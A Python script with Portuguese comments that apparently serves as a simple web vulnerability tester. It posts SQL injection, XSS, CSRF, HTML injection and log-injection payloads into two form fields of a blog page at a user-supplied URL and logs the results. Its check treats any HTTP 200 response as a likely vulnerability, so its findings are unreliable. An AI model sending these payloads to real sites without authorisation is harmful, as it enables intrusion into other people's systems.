import requests
import sys
import time
import json
from datetime import datetime
from pathlib import Path

#diretório dos logs .json
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)#script para criar pasta log quando não existir


if len(sys.argv) > 2:
    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
else:
    print("URL base e/ou taxa de envio não foram fornecidas.")
    sys.exit(1)

# Mapeia a taxa de envio para um intervalo de tempo específico
delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida

# Construir a URL alvo usando a URL base e o nome da página
url_alvo = f"{url_base}/index.php?page=add-to-your-blog.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# Lista de campos para testar
campos_formulario = ['blog_entry', 'logged_in_user_name']

# Dicionário com payloads para cada tipo de vulnerabilidade
payloads = {
    'SQL Injection': "' OR '1'='1",
    'XSS': "<script>alert('XSS')</script>",
    'Cross Site Request Forgery (CSRF)': "<form action='url_da_pagina_vulneravel' method='POST'><input type='hidden' name='campo_vulneravel' value='valor_malicioso' /><input type='submit' /></form>",
    'JavaScript Validation Bypass': "admin' --; <script>document.forms[0].submit();</script>",
    'HTML Injection in Blog Input Field': "<h1>Injected HTML Content</h1>",
    'Application Exception Output': "' UNION SELECT throw_error('Exception Output') --",
    'Application Log Injection': "username=admin&password=admin123\n[Injected Log Entry]",
    'Known Vulnerable Output: Name': "' OR '1'='1 --",
    'Known Vulnerable Output: Comment': "<script>alert('Vulnerable Output in Comment');</script>",
    'Known Vulnerable Output: Add Blog for Title': "<script>alert('Vulnerable Output in Add Blog for Title');</script>"
}

# Contadores para os resultados dos testes
total_testes = 0
testes_passaram = 0
testes_falharam = 0

# Realizar os testes
for campo in campos_formulario:
    for tipo_vulnerabilidade, payload in payloads.items():
        dados_formulario = {c: 'teste' for c in campos_formulario}  # Todos os campos com 'teste'
        
        # Especificar qual campo deve receber o payload, se necessário
        if "in Blog Input Field" in tipo_vulnerabilidade:
            campo_especifico = 'blog_entry'  # Assumindo 'blog_entry' como campo de blog
        else:
            campo_especifico = campo

        dados_formulario[campo_especifico] = payload  # Campo atual com o payload

        total_testes += 1

        # Enviar a requisição
        resposta_teste = requests.post(url_alvo, data=dados_formulario, headers=headers)

        # Verificar se o teste foi bem-sucedido usando o código de status
        if resposta_teste.status_code == 200:
            print(f"Teste #{total_testes} PASSOU: Vulnerabilidade '{tipo_vulnerabilidade}' possivelmente encontrada no campo '{campo_especifico}'!")
            testes_passaram += 1
        else:
            print(f"Teste #{total_testes} FALHOU: Código de status {resposta_teste.status_code}.")
            testes_falharam += 1

        time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio

# Reportar os resultados finais
print(f"\nTotal de Testes: {total_testes}")
print(f"Testes Passaram: {testes_passaram}")
print(f"Testes Falharam: {testes_falharam}")
print(f"Url Testada: {url_alvo}")

#-------------------------Parte de obtenção dos dados--------------------------------------- 
# Gravar os resultados em um arquivo JSON
resultados = {
    'data_hora': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
    'url_base': url_base,
    'total_testes': total_testes,
    'testes_passaram': testes_passaram,
    'testes_falharam': testes_falharam,
    'url_testada': url_alvo
}

nome_arquivo = f"resultados_{resultados['data_hora']}.json"
caminho_completo_arquivo = logs_dir.joinpath(nome_arquivo)

with open(caminho_completo_arquivo, 'w') as arquivo:
    json.dump(resultados, arquivo, indent=4)

print(f"\nResultados gravados em {caminho_completo_arquivo}")